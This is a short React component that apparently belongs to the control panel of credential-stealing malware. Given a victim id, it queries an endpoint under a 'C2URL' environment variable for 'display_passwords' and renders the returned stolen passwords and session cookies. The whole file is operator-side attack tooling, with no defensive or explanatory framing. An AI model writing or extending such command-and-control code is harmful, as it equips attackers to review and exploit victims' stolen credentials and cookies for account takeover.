import { useEffect, useState, useCallback } from "react";

function Passworddisplay(props) {
  const [cookies, setCookies] = useState();
  const [passwords, setPasswords] = useState();
  const [loading, setIsLoading] = useState();
  const [error, setError] = useState();
  const [message, setMessage] = useState();
  
  let id = props.id
  console.log("Id: " + id)

  async function getData(id) {
    console.log("get data called")
    try {
      let response = await fetch(
        process.env.REACT_APP_C2URL + "/display_passwords",
        {
          method: "POST",
          mode: "cors",
          body: JSON.stringify({ id: id }),
          headers: {
            "Content-Type": "application/json",
          },
        }
      );
      let respJSON = await response.json();
      let data = respJSON;

      console.log("data.passwords: " + data.passwords)
      setPasswords(data.passwords);
      setCookies(data.cookies);
      if (response.status === 200) {
      } else {
        setMessage("Error getting data");
      }
    } catch (error) {
      console.log("error: " + error.message)
      setError(error.message);
    }
  };

  useEffect(() => {
    getData(id)
}, [id])

  if (loading) return <div></div>
  return (
    <div>
      <ul>
        <li>{JSON.stringify(cookies)}</li>

        <li>{JSON.stringify(passwords)}</li>
      </ul>
    </div>
  );
}

export default Passworddisplay;
